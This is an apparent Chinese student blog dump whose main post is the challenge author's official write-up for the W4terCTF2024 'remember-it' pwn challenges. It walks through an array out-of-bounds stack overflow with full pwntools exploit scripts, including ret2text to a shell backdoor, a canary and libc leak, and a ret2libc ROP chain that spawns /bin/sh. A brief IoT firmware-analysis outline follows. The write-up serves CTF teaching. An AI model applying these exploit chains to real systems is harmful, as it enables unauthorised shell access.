[{"content":"Hi！你好呀！\n欢迎来到我的博客！\n我是 ta0lve，一名普通的大学生。\n在这个博客里，我记录了大一到大二期间的一些零碎笔记，内容可能有些杂乱，感谢大家的包容与理解。\n","date":"May 6, 2024","permalink":"/","section":"","summary":"Hi！你好呀！ 欢迎来到我的博客！ 我是 ta0lve，一名普通的","title":""},{"content":"","date":"May 6, 2024","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"May 6, 2024","permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":" 想看看有关 pwn 的文章吗？ 点击这里立即跳转. ","date":"May 6, 2024","permalink":"/posts/","section":"Posts","summary":"想看看有关 pwn 的文章吗？ 点击这里立即跳转.","title":"Posts"},{"content":"","date":"May 6, 2024","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"PWN"},{"content":"","date":"May 6, 2024","permalink":"/categories/pwn%E5%85%A5%E9%97%A8/","section":"Categories","summary":"","title":"pwn入门"},{"content":"","date":"May 6, 2024","permalink":"/series/pwn%E5%85%A5%E9%97%A8/","section":"Series","summary":"","title":"PWN入门"},{"content":"W4terCTF2024 remember-it-012 出题人题解~\nRemember It 0 # 题目描述 # Do you have a good memory?\nPlay this simple memory game in your terminal!\nTry your best to remember all the strings!\n题目解析 # 本题的主要考点为 nc 和 pwntools 库的使用\n预期解有很多，最正经的当然是使用 pwntools 库写脚本进行自动化交互：\nfrom pwn import* # context.log_level = \u0026#39;debug\u0026#39; # sh = process(\u0026#39;./remember_it_0\u0026#39;) sh = remote(\u0026#39;127.0.0.1\u0026#39;, 12345) for num in range(1, 11): sh.sendlineafter(b\u0026#39;Your choice:\u0026#39;, b\u0026#39;1\u0026#39;) ans = sh.recvline()[14+len(str(num)):-6*num-1] sh.sendlineafter(b\u0026#34;plz input your answer\\n\u0026#34;, ans) sh.interactive() 还有一些其他的预期解法，以及看了大家的 wp 之后新增的一些解法：\nnc 使用 -o参数记录输出信息 使用 tee 、script 等命令记录输出信息 在需要记忆的字符串出现后输入无关字符阻碍printf(\u0026quot;\\b \\b\u0026quot;);函数覆盖字符串 通过截屏录屏/拍照录像等方式在 nc 连接下通关 靠强大的记忆力（bushi \u0026hellip;\u0026hellip; 还有一些其他的解法，这里就不一一列举了\nRemember It 1 # 题目描述 # Introduction to pwning.\nDo you have a good memory?\nPlay this simple memory game on your terminal for a second time!\nTry your best to remember all the strings!\n题目解析 # Learn the basic knowledge about stack and Return Oriented Programming in this challenge\n强烈建议大家移步至 W4terCTF 2023 Tic-Tac-Toe Level 0 的 wp 学习栈溢出漏洞的具体利用及 gdb 的使用\n（在q群中可以找到哦）\n本题的主要考点为 数组越界 + 栈溢出 + ret2text（篡改栈帧上的返回地址为程序中已有的后门函数）\n题⽬给出了源代码，注意这部分：\nif(count \u0026gt;= 10){ if(correct == 10){ success(); } printf(\u0026#34;\\n[*] plz restart from the beginning or leave \\n\\n\u0026#34;); } 在 remember_it_1 的程序中 count 的值达到 10 之后并没有将其置 0 或者结束程序，而是继续运行\n我们知道用户输入的数组的定义是 char player_answer[10][32]={0}，而程序将用户的输入读取到 player_answer[count] 中，但 count 的值是有可能大于 10 的，所以会导致栈溢出漏洞\n注意：read(0, player_answer[count], 32) 这个语句的栈溢出漏洞并不只是 read 函数导致的，没有限制 count 的范围也是漏洞发生的原因\n在利用栈溢出漏洞之前，我们需要基本了解栈的概念，这是⼀块虚拟内存空间，其中保存有函数调用信息以及局部变量，它按照如下的方式工作。\n在某⼀个函数 f 中，栈的状态：\n┌──────────────┐ \u0026lt;-- stack pointer, lower address │ variables_c ├──────────────┤ │ variables_b ├──────────────┤ │ variables_a └──────────────┘ \u0026lt;-- stack base pointer, higher address 当这个函数调用了 g ，为了记录 g 返回时应该返回到什么位置，于是把这个返回地址入栈。 之后入栈旧的 stack base pointer，将 stack pointer 的值赋值给 stack base pointer，这样就使得 stack pointer 和 stack base pointer 之间的内容是新的 g 函数的 stack frame 了。\n┌──────────────────┐ \u0026lt;-- stack pointer │ stack base pointe ├──────────────────┤ │ return address ├──────────────────┤ │ variables_c ├──────────────────┤ │ variables_b ├──────────────────┤ │ variables_a └──────────────────┘ g 也会有自己的局部变量，stack pointer 向低地址移动\n┌──────────────────┐\u0026lt;-- stack pointer │ variables_g ├──────────────────┤\u0026lt;-- stack base pointer │ stack base pointer ├──────────────────┤ │ return address ├──────────────────┤ │ variables_c ├──────────────────┤ │ variables_b ├──────────────────┤ │ variables_a └──────────────────┘ 当 g 准备返回，stack pointer 移动， 恢复 stack base pointer 返回指令 pop 出栈顶的返回地址，返回到对应函数\n┌──────────────┐ \u0026lt;-- stack pointer │ return address ├──────────────┤ │ variables_c ├──────────────┤ │ variables_b ├──────────────┤ │ variables_a └──────────────┘ 回到题目， 程序的 char player_answer[10][32] 是栈上的局部变量，所以栈的结构可能是这样的：\n┌──────────────────┐\u0026lt;-- stack pointer │ char player_answer[10][32] ├──────────────────┤\u0026lt;-- stack base pointer │ stack base pointer ├──────────────────┤ │ return address ├──────────────────┤ │ variables_c ├──────────────────┤ │ variables_b ├──────────────────┤ │ variables_a └──────────────────┘ 当然，程序还有其他的局部变量，player_answer[count] 的位置并不一定就是紧挨着 stack base pointer ，我们还需要使用 gdb 或者 IDA 等工具帮我们具体分析栈结构\n也就是说，当 count 的值大于 10 时，我们就可以通过 read(0, player_answer[count], 32) 语句来用我们的输入的数据去覆盖掉栈上储存的旧的 stack base pointer 和 return address， 进而在 main() 函数返回的时候，控制其返回的地址\n在这里，大家可能会发现自己没有办法执行附件里的程序，这有可能是因为没有找到对应的库，我们可以通 过 ldd 观察程序运行时需要的库\nldd remember_it_1 linux-vdso.so.1 (0x00007fff3f7af000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7e98800000) /lib64/ld-linux-x86-64.so.2 (0x00007f7e98bc1000)\n接下来我们使用patchelf，将这些库指向我们附件中提供的库文件 patchelf \u0026ndash;replace-needed libc.so.6 ./libc.so.6 ./remember_it_1 patchelf \u0026ndash;set-interpreter ld-linux-x86-64.so.2 ./remember_it_1\n你也可以像比赛时的远程环境一样使用 chroot 来配置运行环境。这些技巧在后面的题目和以后的比赛中都十分有用。\n接下来使用 gdb 调试，以下例子使用 gef 插件中的 telescope 命令来观察中的数据\n你可以使用命令的缩写（没有歧议的情况下）\n比如使用 tel -l 10 $rbp 来观察 RBP 寄存器中的地址往后的 10 个数据\n依次执行\ngdb remember_it_1 r 1 abcd 1 [ctrl + c] tel -l 10 $rbp 可以看到：\ngef➤ tel -l 10 $rbp 0x00007fffffffdeb0│+0x0000: 0x0000000000000001\t← $rbp 0x00007fffffffdeb8│+0x0008: 0x00007ffff7c29d90 → \u0026lt;__libc_start_call_main+128\u0026gt; mov edi, eax 0x00007fffffffdec0│+0x0010: 0x0000000000000000 0x00007fffffffdeb8 处存储的 0x00007ffff7c29d90 是 __libc_start_call_main+128 的地址，其实这就是 main 函数返回后执行的下⼀条指令的位置\n那我们要如何定位 player_answer[count] 在栈上的位置呢，最简单的办法就是使用 tel 命令继续查看栈上的值。我们已经在第一个 answer 处输入了 abcd ，可以通过类似 tel -l -10 $rbp 或者 tel -l 10 $rsp 的命令查看栈的结构\ngef➤ tel -l -50 $rbp 0x00007fffffffdd28│-0x0188: 0x0000000000000000 0x00007fffffffdd30│-0x0180: 0x0000000000000000 0x00007fffffffdd38│-0x0178: 0x0000000000000000 0x00007fffffffdd40│-0x0170: 0x0000000000000000 0x00007fffffffdd48│-0x0168: 0x0000000100000000 0x00007fffffffdd50│-0x0160: 0x0000000a64636261 (\u0026#34;abcd\\n\u0026#34;?) 0x00007fffffffdd58│-0x0158: 0x0000000000000000 0x00007fffffffdd60│-0x0150: 0x0000000000000000 0x00007fffffffdd68│-0x0148: 0x0000000000000000 0x00007fffffffdd70│-0x0140: 0x0000000000000000\t← $rsi 0x00007fffffffdd78│-0x0138: 0x0000000000000000 ... 0x00007fffffffde88│-0x0028: 0x0000000000000000 0x00007fffffffde90│-0x0020: 0x00007fffffffe329 → 0x000034365f363878 (\u0026#34;x86_64\u0026#34;?) 0x00007fffffffde98│-0x0018: 0x0000000500000064 (\u0026#34;d\u0026#34;?) 0x00007fffffffdea0│-0x0010: 0x0000000000000005 0x00007fffffffdea8│-0x0008: 0x0000000100000005 0x00007fffffffdeb0│+0x0000: 0x0000000000000001\t← $rbp 可以看到我们输入的字符在距离 rbp 0x0160 的位置，而 0x160 = 352 = 32 * 11\n所以 rbp 所在的位置其实是 player_answer[11][0:8] ，而返回地址则是 player_answer[11][8:16]\n我们可以写一个简单的脚本来验证一下：\n此处的脚本使用了 pwntools 库里的函数，虽然人工操作也可以但是过程繁琐，使用脚本则可以起到事半功倍的效果\nfrom pwn import* context.log_level = \u0026#39;debug\u0026#39; sh = process(\u0026#39;./remember_it_1\u0026#39;) for _ in range(11): sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;1\u0026#34;) sh.sendlineafter(b\u0026#34;plz input your answer\\n\u0026#34;, b\u0026#34;a\u0026#34;) payload = p64(1) + p64(0xdeadbeef) sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;1\u0026#34;) sh.sendlineafter(b\u0026#34;plz input your answer\\n\u0026#34;, payload) gdb.attach(sh) # attach with gdb pause() sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;4\u0026#34;) sh.interactive() 我们可以看到 gdb 成功的运行了：\n[*] running in new terminal: [\u0026#39;/usr/bin/gdb\u0026#39;, \u0026#39;-q\u0026#39;, \u0026#39;./remember_it_1\u0026#39;, \u0026#39;2815084\u0026#39;] [*] Paused (press any to continue) 输入任意字符使程序继续运行后，我们在 gdb 窗口输入 continue 命令（简写为 c），会发现由于程序想要执行 0xdeadbeef 地址上的指令而报错\n──────────────────────── code:x86:64 ──── [!] Cannot disassemble from $PC [!] Cannot access memory at address 0xdeadbeef ──────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;remember_it_1\u0026#34;, stopped 0xdeadbeef in ?? (), reason: SIGSEGV 可以看出我们所输入的 0xdeafbeef 已经覆盖了程序的 return address 并成功控制程序执行流\n注意：如果没有 sh.sendlineafter(b\u0026quot;Your choice: \u0026ldquo;, b\u0026quot;4\u0026rdquo;) 语句，程序可能一直执行 main 函数，即使我们覆盖了返回地址，也并不能控制当前程序的执行流\n在代码我们还可以看到一个后门函数：\nvoid FEE1DEAD() { execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, (char *)NULL); } 我们将 return address 覆盖为这个函数的地址就可以让程序执行后门函数进而成功 getshell ！\n我们可以在 IDA 中获得 FEE1DEAD() 函数的地址，也可以通过 gdb 的一些命令例如 disass\ngef➤ disass FEE1DEAD Dump of assembler code for function FEE1DEAD: 0x00000000004018b6 \u0026lt;+0\u0026gt;:\tendbr64 0x00000000004018ba \u0026lt;+4\u0026gt;:\tpush rbp 0x00000000004018bb \u0026lt;+5\u0026gt;:\tmov rbp,rsp 0x00000000004018be \u0026lt;+8\u0026gt;:\tmov edx,0x0 0x00000000004018c3 \u0026lt;+13\u0026gt;:\tlea rax,[rip+0xcb8] # 0x402582 0x00000000004018ca \u0026lt;+20\u0026gt;:\tmov rsi,rax 0x00000000004018cd \u0026lt;+23\u0026gt;:\tlea rax,[rip+0xcb1] # 0x402585 0x00000000004018d4 \u0026lt;+30\u0026gt;:\tmov rdi,rax 0x00000000004018d7 \u0026lt;+33\u0026gt;:\tmov eax,0x0 0x00000000004018dc \u0026lt;+38\u0026gt;:\tcall 0x401180 \u0026lt;execl@plt\u0026gt; 0x00000000004018e1 \u0026lt;+43\u0026gt;:\tnop 0x00000000004018e2 \u0026lt;+44\u0026gt;:\tpop rbp 0x00000000004018e3 \u0026lt;+45\u0026gt;:\tret End of assembler dump. 还可以利用 pwntools 库：\nfrom pwn import* elf = ELF(\u0026#39;./remember_it_1\u0026#39;) backdoor = elf.sym[\u0026#39;FEE1DEAD\u0026#39;] log.success(f\u0026#34;backdoor = {backdoor:#x}\u0026#34;) # 输出： # [+] backdoor = 0x4018b6 可以得到 FEE1DEAD() 函数的地址为 0x4018b6\n由于 \\xb6\\x18\\x40 这三个字符都不在我们的键盘上，所以我们使用 pwntools 来发送这个 payload\n本题 exp :\nfrom pwn import* # context.log_level = \u0026#39;debug\u0026#39; # sh = process(\u0026#39;./remember_it_1\u0026#39;) sh = remote(\u0026#39;127.0.0.1\u0026#39;, 12345) for _ in range(11): sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;1\u0026#34;) sh.sendlineafter(b\u0026#34;plz input your answer\\n\u0026#34;, b\u0026#34;a\u0026#34;) backdoor = 0x4018b6 payload = p64(0) + p64(backdoor) sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;1\u0026#34;) sh.sendlineafter(b\u0026#34;plz input your answer\\n\u0026#34;, payload) sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;4\u0026#34;) sh.interactive() Remember It 2 # Learn how to bypass canary and Address Space Layout Randomization in this challenge\n题目描述 # Introduction to pwning.\nDo you have a good memory?\nPlay this simple memory game on your terminal for the third time!\nTry your best to remember all the strings!\n题目解析 # 本题的主要考点为 数组越界 + 栈溢出 + canary leak + ret2libc\n漏洞点与 remember_it_1 相同，但是本题多开了两个保护机制，我们可以使用 checksec 来看两个程序的区别\n$ checksec remember_it_1 [*] \u0026#39;/src/remember_it_1\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found \u0026lt;=== Watch out! NX: NX enabled PIE: No PIE (0x400000) \u0026lt;=== Watch out! $ checksec remember_it_2 [*] \u0026#39;/src/remember_it_2\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found \u0026lt;=== Watch out! NX: NX enabled PIE: PIE enabled \u0026lt;=== Watch out! 如果是最新版的 checksec 则是这样的：\n$ checksec --file=remember_it_1 RELRO STACK CANARY NX PIE ... Partial RELRO No canary found NX enabled No PIE ... $ checksec --file=remember_it_2 RELRO STACK CANARY NX PIE ... Full RELRO Canary found NX enabled PIE enabled ... 所以为了能够顺利的利用栈溢出漏洞获得程序的 shell，我们要先绕过 canary 和 PIE 两个保护机制\n强烈建议大家移步至 W4terCTF 2023 Nimgame Level 1 \u0026amp; 2 的 wp 学习漏洞的具体利用及保护机制的绕过方式\n（在q群中可以找到哦）\n解题过程为：\n先覆盖 canary 的 '\\x00' 字节来 leak canary 再通过泄露 __libc_start_call_main + 128 的地址来 leak libcbase 最后使用 ret2libc 等方法来 getshell Canary # 我们先来简要了解⼀下什么是 Canary，使用 gdb，依次执行：\ngdb remember_it_2 r 1 [ctrl + c] tel $rbp-0x10 我们可以观察到在 old rbp 和 return address 的上方，也就是 [rbp-0x8] 的位置上，多了一个以 \\x00 结尾的数据\ngef➤ tel $rbp-0x10 0x00007fffffffdea0│+0x0000: 0x0000000000001000 0x00007fffffffdea8│+0x0008: 0xca45816933b85c00 0x00007fffffffdeb0│+0x0010: 0x0000000000000001\t← $rbp 0x00007fffffffdeb8│+0x0018: 0x00007ffff7c29d90 → \u0026lt;__libc_start_call_main+128\u0026gt; mov edi, eax 我们还可以通过 x 命令看到 main 函数结尾处的有一段指令\nx 指令（memory read）可以通过 / format 来设置输出格式，例如以下的输出设置了打印 6 个指令（i）\ngef➤ x/6i main+1117 0x555555555706 \u0026lt;main+1117\u0026gt;:\tmov rdx,QWORD PTR [rbp-0x8] 0x55555555570a \u0026lt;main+1121\u0026gt;:\tsub rdx,QWORD PTR fs:0x28 0x555555555713 \u0026lt;main+1130\u0026gt;:\tje 0x55555555571a \u0026lt;main+1137\u0026gt; 0x555555555715 \u0026lt;main+1132\u0026gt;:\tcall 0x555555555120 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x55555555571a \u0026lt;main+1137\u0026gt;:\tleave 0x55555555571b \u0026lt;main+1138\u0026gt;:\tret 这段指令取出这段新增的数据，将它和 fs:0x28 处的数据作比较，相同则跳转，不相同则调用 stack_chk_fail()\n这里我们已经可以发现，像上一道题一样，连续覆盖直到覆盖掉返回地址来控制执行流的方法已经不可行了。因为这会导致这个新增的数据也被一并覆盖，进而函数不会正常返回，这一个新增的数据就是 Canary。\nCanary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。\n所以，我们要想办法绕过这个检查，一个可行的方法是，我们能不能知道这个位置所储存的数据，进而在覆盖的时候，覆盖回原数据，然后继续覆盖 rbp 和返回地址呢？这是可行的！\n注意当我们的 choice 为 3 的时候，程序会打印我们输入的字符串。\nprintf(\u0026#34;[wrong] your answer is %s\u0026#34;, player_answer[i]); 而利用上一题的方法我们可以得到 Canary 所在的位置其实是 player_answer[10][8:16] 的位置，由于 printf() 函数在遇到 \\x00 时会中止输出，所以我们需要将 Canary 低位的 0x00 覆盖掉，就可以在这个时候把 Canary 的值一并输出了！当然这里有很多不可打印字符，所以我们使用 pwntools 来进行接收数据\n我们可以写一个简单的脚本来验证一下：\nfrom pwn import* # context.log_level = \u0026#39;debug\u0026#39; sh = process(\u0026#39;./remember_it_2\u0026#39;) # sh = remote(\u0026#39;127.0.0.1\u0026#39;, 12345) def cmd(num): sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, str(num).encode()) def answer(pay): cmd(1) sh.sendlineafter(b\u0026#34;plz input your answer\\n\u0026#34;, pay) # sendline will send a \u0026#39;\\n\u0026#39; def show(): cmd(3) \u0026#34;\u0026#34;\u0026#34; step1: leak canary \u0026#34;\u0026#34;\u0026#34; for _ in range(10): answer(b\u0026#34;a\u0026#34;) answer(b\u0026#34;a\u0026#34;*8) show() sh.recvuntil(b\u0026#39;a\u0026#39;*8) canary = u64(sh.recv(8)) - 0xa # don\u0026#39;t forget to substract the 0x0a we sent. log.success(f\u0026#34;canary = {canary:#x}\u0026#34;) gdb.attach(sh) # attach with gdb sh.interactive() 运行一下：\n$ python3 test.py [+] Starting local process \u0026#39;./remember_it_2\u0026#39;: pid 2817175 [+] canary = 0xd499a67319a6e600 [*] running in new terminal: [\u0026#39;/usr/bin/gdb\u0026#39;, \u0026#39;-q\u0026#39;, \u0026#39;./remember_it_2\u0026#39;, \u0026#39;2817175\u0026#39;] [*] Switching to interactive mode 在gdb中验证：\ngef➤ canary canary : 0xd499a67319a6e600 gef➤ 成功获得 Canary 的值！\nPIE # PIE 是 Position Independent Executables 的缩写。这样子的可执行文件可以在不做修改的情况下在任意内存对齐的位置运行，也就是说，这样的可执行文件可以随机化其加载地址。在这样的程序里，我们不能通过一个定值控制程序的跳转。同时，观察源代码我们可以知道，程序中存在的 getshell 后门也被移除了。那么我们就需要利用程序中的其他代码来实现 get shell 了。\n我们已经学会了通过简单的返回地址覆盖来控制程序执行流，如果我们能够把一些指令给连续执行起来，那么会怎么样呢?考虑以下情况\n0x10000000: pop rdi. ret : 0x20000000: pop rsi:rets 0x30000000: call function: 假设现在执行的是 ret 指令，那么程序将会跳转到 0x10000000 处\n┌──────────────────┐ \u0026lt;-- stack pointer │ 0x10000000 ├──────────────────┤ │ 0x12345678 ├──────────────────┤ │ 0x20000000 ├──────────────────┤ │ 0x1234abcd ├──────────────────┤ │ 0x30000000 └──────────────────┘ 接下来执行 pop rdi; 0x12345678 就会被放入 rdi 寄存器中，stack pointer 相应移动\n┌──────────────────┐ \u0026lt;-- stack pointer │ 0x12345678 ├──────────────────┤ │ 0x20000000 ├──────────────────┤ │ 0x1234abcd ├──────────────────┤ │ 0x30000000 └──────────────────┘ 接下来执行 ret 指令，那么程序会继续跳转到 0x20000000\n┌──────────────────┐ \u0026lt;-- stack pointer │ 0x20000000 │ ├──────────────────┤ │ 0x1234abcd │ ├──────────────────┤ │ 0x30000000 │ └──────────────────┘ 如上构造，我们最终可以实现 function(0x12345678，0x1234abcd) 的效果，其中，使用到的这些指令片段就被称为 Gadget，这样构造出来的跳转链条就是一条 ROP Chain，由于变长指令的特性，我们可以在程序中找到很多 Gadget 供我们使用。\nSystem V AMD64 ABI 约定，前6个整形参数放在寄存器 RDI, RSI, RDX, RCX, R8 和 R9 上，额外的参数入栈。\n我们可以通过一些工具来查找这样的代码片段，比如 ROPGadget\nROPgadget \u0026ndash;binary ./libc.so.6 \u0026ndash;only \u0026ldquo;pop|ret\u0026rdquo; | grep rdi 0x000000000002a745 : pop rdi ; pop rbp ; ret 0x000000000002a3e5 : pop rdi ; ret\n我们可以在结果中搜索需要的代码片段。 如果需要查找符号对应的地址，可以使用 pwntools 库：\n$ python \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; libc = ELF(\u0026#39;./libc.so.6\u0026#39;) [*] \u0026#39;/mnt/hgfs/share/wp/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u0026gt;\u0026gt;\u0026gt; libc.sym[\u0026#39;system\u0026#39;] 331120 \u0026gt;\u0026gt;\u0026gt; libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() 1934968 \u0026gt;\u0026gt;\u0026gt; next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) 1934968 \u0026gt;\u0026gt;\u0026gt; 那么我们知道了栈溢出的构造目标，接下来就是，如何确定这些代码片段的地址呢？这就需要我们泄漏出一些地址。如果你还记得在上一部分观察程序栈中的数据时的结果，就可以发现\ngef➤ tel $rbp-0x10 0x00007fffffffdea0│+0x0000: 0x0000000000001000 0x00007fffffffdea8│+0x0008: 0x559a52ecda8a5800 0x00007fffffffdeb0│+0x0010: 0x0000000000000001\t← $rbp 0x00007fffffffdeb8│+0x0018: 0x00007ffff7c29d90 → \u0026lt;__libc_start_call_main+128\u0026gt; mov edi, eax 栈上有很多数据，其中还包括了主程序的地址，各类库的地址，它们因为局部变量，返回地址保存等等原因留在栈上，比如这里的 0x00007fffffffdeb8 就储存了 libc_start_ca1l_main+128 的地址。\n我们可以通过上一部分提到的方法，把这个地址也泄漏出来，当然，要先将选择 choice 2 从头开始在来一次泄露的过程，而此时我们要泄露的 libc_start_ca1l_main+128 则在 player_answer[11][8:16] 的位置。\n泄露 __libc_start_call_main+128 的地址时常见的方式有两种：\n# 1 sh.recvuntil(b\u0026#39;ab\\n\u0026#39;) # for example libcleak = u64(sh.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) # leak __libc_start_call_main+128 # 2 libcleak = u64(sh.recvuntil(b\u0026#34;\\x7f\u0026#34;).ljust(8, b\u0026#39;\\x00\u0026#39;)) # leak __libc_start_call_main+128 大多数情况下两种方式都可以，但是在本次比赛中所使用的 Linux kernel 对 aslr 保护机制进行了加强，增加了内存映射随机化的位数，使得 libc 库加载的地址不再是固定以 \u0026ldquo;\\x7f\u0026rdquo; 或是 \u0026ldquo;\\x7e\u0026rdquo; 开头，所以第二种方式的成功率会大大降低\n具体可以看：\nhttps://zolutal.github.io/aslrnt/ https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/noble/commit/?h=master-next\u0026id=760c2b1fa1f5e95be1117bc7b80afb8441d4b002 Linux 中的 ASLR（Address Space Layout Randomization）机制通过对栈、内存映射段、堆的起始地址加上随机偏移量来打乱虚拟地址空间布局，从而增加攻击者猜测系统资源地址的难度，提高了系统的安全性\n由于我们泄漏出来的这个地址和 libc 库加载的基地址之间的偏移是固定的，得到这个地址，就相当于得到了 libc 库的地址。\n我们可以通过 vmmap 命令来查看内存映射情况\ngef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /.../remember_it_2 ... 0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 ... 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall] gef➤ p 0x00007ffff7c29d90 - 0x00007ffff7c00000 $1 = 0x29d90 这里我们得到的\n0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 就表明了libc的基地址是 0x00007ffff7c00000。\n由于0x00007ffff7c29d90 - 0x00007ffff7c00000 = 0x29d90，所以泄漏这个地址之后，减去 0x29d90 就知道 Iibc被加载到什么位置了。\n同时，libc中也存在有 /bin/sh 这样的字符串，所以通过这些，我们就可以构造出一条调用 system(\u0026quot;bin/sh\u0026quot;) 的链了!\nbinsh = libcbase + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # get /bin/sh address in libc system = libcbase + libc.symbols[\u0026#39;system\u0026#39;] pop_rdi_ret = libcbase + 0x000000000002a3e5 # ROPgadget --binary libc* --only \u0026#34;pop|ret\u0026#34;|grep rdi ret = libcbase + 0x000000000002a3e6 # ROPgadget --binary libc* --only \u0026#34;ret\u0026#34; 不知道如何使用附件里的libc? 请查看 remember_it_1 的 writeup\n本题理论上也可以用 onegadget 完成，但实际利用时会发现利用的条件难以满足，所以选择构造 ROP 链来 getshell\n但是，你可能还会遇到一个问题，栈对齐问题：\ngef➤ x/i do_system+115 0x7ffff7c50973 \u0026lt;do_system+115\u0026gt;:\tmovaps XMMWORD PTR [rsp],xmm1 system() 函数中存在这样的指令，它要求栈按照 0x10 对齐，如果你发现对齐有误，可以在 ROP 链中增加一条 ret 指令的 Gadget，将 stackpointer 移动 0x8 完成对齐。\nROPgadget --binary libc.so.6 --only \u0026#34;ret\u0026#34; Gadgets information ============================================================ 0x0000000000029139 : ret 本题 exp :\nfrom pwn import* context.log_level = \u0026#39;debug\u0026#39; # sh = process(\u0026#39;./remember_it_2\u0026#39;) sh = remote(\u0026#39;127.0.0.1\u0026#39;, 12345) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) def cmd(num): sh.sendlineafter(b\u0026#34;Your choice: \u0026#34;, str(num).encode()) def answer(pay): cmd(1) sh.sendlineafter(b\u0026#34;plz input your answer\\n\u0026#34;, pay) def restart(): cmd(2) def show(): cmd(3) def leave(): cmd(4) \u0026#34;\u0026#34;\u0026#34; step1: leak canary \u0026#34;\u0026#34;\u0026#34; for _ in range(10): answer(b\u0026#34;a\u0026#34;) answer(b\u0026#34;a\u0026#34;*8) show() sh.recvuntil(b\u0026#39;a\u0026#39;*8) canary = u64(sh.recv(8)) - 0xa log.success(f\u0026#34;canary = {canary:#x}\u0026#34;) \u0026#34;\u0026#34;\u0026#34; step2: leak libc \u0026#34;\u0026#34;\u0026#34; restart() for _ in range(10): answer(b\u0026#34;b\u0026#34;) answer(b\u0026#34;a\u0026#34;*22 + b\u0026#39;b\u0026#39;) show() sh.recvuntil(b\u0026#39;ab\\n\u0026#39;) libcleak = u64(sh.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) # __libc_start_call_main+128 libcshift = 0x29d90 libcbase = libcleak - libcshift log.success(f\u0026#34;libcbase = {libcbase:#x}\u0026#34;) # assert libcbase \u0026amp; 0xfff == 0, \u0026#34;wrong libcbase\u0026#34; \u0026#34;\u0026#34;\u0026#34; step3: pwn! ret2libc \u0026#34;\u0026#34;\u0026#34; restart() for _ in range(10): answer(b\u0026#34;c\u0026#34;) binsh = libcbase + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # get /bin/sh address in libc system = libcbase + libc.symbols[\u0026#39;system\u0026#39;] pop_rdi_ret = libcbase + 0x000000000002a3e5 # ROPgadget --binary libc* --only \u0026#34;pop|ret\u0026#34;|grep rdi ret = libcbase + 0x000000000002a3e6 # ROPgadget --binary libc* --only \u0026#34;ret\u0026#34; payload = b\u0026#39;a\u0026#39;*8 + p64(canary) + b\u0026#39;b\u0026#39;*8 # padding payload += p64(pop_rdi_ret) # pop rdi; ret; payload2 = p64(binsh) # /bin/sh payload2 += p64(ret) # ret; payload2 += p64(system) # system answer(payload) answer(payload2) leave() sh.interactive() ","date":"May 6, 2024","permalink":"/posts/pwn/basic/remember-it-wp/","section":"Posts","summary":"\u003cp\u003eW4terCTF2024 remember-it-012 出题人题解~\u003c/p\u003e","title":"remember-it-012 official wp"},{"content":"","date":"May 6, 2024","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"May 6, 2024","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"February 23, 2024","permalink":"/tags/iot/","section":"Tags","summary":"","title":"IoT"},{"content":" 如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 0x01 获取固件 # 一般从固件厂商官网获取\n也可以通过抓设备升级的包、购买硬件设备来获取固件\n0x02 解密固件 # 参考链接： 固件解密 - IOT 固件安全 All in One (gitbook.io)\n在解密固件之前可以先上网查询有没有相关文章 也可以看一下同一品牌的其他固件是如何解密的 解密固件是分析加密固件所需迈过的第一道坎\n部分固件的解密思路可以参考以下思路：\n看看是不是仍有少部分固件（或过渡版本的固件）并未加密，当这些固件升级的过程中大概也会使用到解密的程序，因此可以通过解开这些未加密固件，找到解密程序，并逆向分析出相关算法，这也是固件解密常用的一种手段。并且，一般一个厂商的固件加密算法都是相同的，这样所有的固件我们都能够解开了\n解密完固件为后续的静态分析做准备\n0x03 仿真模拟 # 动态分析方法需要固件进行仿真模拟，或者在物理设备上进行片上调试，来获得反馈信息\n真实固件的调试可以参考： 固件调试 - IOT 固件安全 All in One (gitbook.io)\n而仿真模拟可以参考以下的思路来进行：\n先使用FirmAE、Firmware Analysis Toolkit等开箱即用的工具进行仿真 固件跑起来并不意味着成功仿真 可能会有部分功能的缺失 